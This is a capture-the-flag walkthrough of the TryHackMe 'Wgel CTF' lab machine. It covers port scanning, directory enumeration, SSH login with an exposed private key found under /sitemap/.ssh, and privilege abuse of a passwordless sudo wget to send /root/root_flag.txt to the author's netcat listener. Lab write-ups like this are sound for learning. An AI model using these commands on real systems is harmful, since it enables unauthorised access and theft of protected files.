# Wgel CTF

TryHackMe room link : [Wget CTF](https://tryhackme.com/room/wgelctf)

## Nmap

`nmap -T 4 -sV 10.10.183.122`

```

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 22:58 EDT
Warning: 10.10.183.122 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.183.122
Host is up (0.22s latency).
Not shown: 996 closed ports

PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
1999/tcp filtered tcp-id-port
3322/tcp filtered active-net

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.00 seconds
```

## Gobuster

`gobuster dir -u http://10.10.183.122 -w /usr/share/wordlists/dirb/common.txt`

```

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.183.122
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/26 23:01:03 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 278]  
/sitemap              (Status: 301) [Size: 316] [--> http://10.10.183.122/sitemap/]
                                                                                   
===============================================================
2021/06/26 23:03:49 Finished
===============================================================
```

lets go to index.html

check source code of index.html

found a name J*****

use gobuster for /sitemap 

`gobuster dir -u http://10.10.183.122/sitemap/ -w /usr/share/wordlists/dirb/common.txt`

```

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.183.122/sitemap/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/26 23:07:29 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.ssh                 (Status: 301) [Size: 321] [--> http://10.10.183.122/sitemap/.ssh/]
/css                  (Status: 301) [Size: 320] [--> http://10.10.183.122/sitemap/css/] 
/fonts                (Status: 301) [Size: 322] [--> http://10.10.183.122/sitemap/fonts/]
/images               (Status: 301) [Size: 323] [--> http://10.10.183.122/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]                                         
/js                   (Status: 301) [Size: 319] [--> http://10.10.183.122/sitemap/js/]    
                                                                                          
===============================================================
2021/06/26 23:10:01 Finished
===============================================================
```

let check .ssh

there is a id_rsa file

we will use this to try to login in ssh 

## SSH

before trying to login, change permission on id_rsa ` chmod 600 id_rsa`

`ssh j*****@10.10.183.122 -i id_rsa`

```

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

j*****@CorpOne:~$
```

logged in successfully

lets find txt file 

```

j*****@CorpOne:~$ find / -type f -name *.txt 2>/dev/null


j*****@CorpOne:~$ cat /home/j*****/Documents/user_flag.txt
************************************
```
lets find what sudo permission j***** user have

`sudo -l`

```

Matching Defaults entries for j***** on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User j***** may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

lets use GTFOBins for wget

## Get root flag

using GTFOBins we know we can use 

`sudo wget --post-file=FILE_NAME http://IP:PORT`

we have to start nc listener on local system

`nc -lvp 9001`

__we know that in TryHackMe, root text file is mostly in /root directory, since user flag was named user_flag.txt, lets try to send  root_flag.txt from /root__

`sudo wget --post-file=/root/root_flag.txt  http://10.9.4.169:9001`

```

nc -lvp 9001
listening on [any] 9001 ...
10.10.183.122: inverse host lookup failed: Unknown host
connect to [10.9.4.169] from (UNKNOWN) [10.10.183.122] 48092
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.9.4.169:9001
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

**********************************          <---- (root_flag.txt)
```

